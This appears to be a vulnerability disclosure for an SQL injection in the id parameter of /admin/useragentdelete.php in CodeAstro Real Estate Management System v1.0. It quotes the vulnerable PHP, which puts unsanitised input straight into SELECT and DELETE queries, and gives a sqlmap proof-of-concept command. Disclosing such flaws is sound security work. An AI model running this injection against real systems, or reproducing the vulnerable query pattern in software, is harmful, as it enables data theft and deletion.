# SQLi in CodeAstro Real Estate Management System v1.0 of file /admin/useragentdelete.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /admin/useragentdelete.php

**Version**

- V1.0

### Analyse

**injection point: id**

```php
<?php
include("config.php");
$uid = $_GET['id'];

// view code//
$sql = "SELECT * FROM user where uid='$uid'";
$result = mysqli_query($con, $sql);
while($row = mysqli_fetch_array($result))
	{
	  $img=$row["uimage"];
	}
@unlink('user/'.$img);

//end view code
$msg="";
$sql = "DELETE FROM user WHERE uid = {$uid}";
$result = mysqli_query($con, $sql);
if($result == true)
{
	$msg="<p class='alert alert-success'>Agent Deleted</p>";
	header("Location:useragent.php?msg=$msg");
}
else
{
	$msg="<p class='alert alert-warning'>Agent not Deleted</p>";
		header("Location:useragent.php?msg=$msg");
}

mysqli_close($con);
?>

```

### POC

```bash
sqlmap -u "http://192.168.93.1/RealEstate-PHP/admin/useragentdelete.php?id=1" --dbms=mysql --level=2
```



![image-20251212095652137](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512120956229.png)

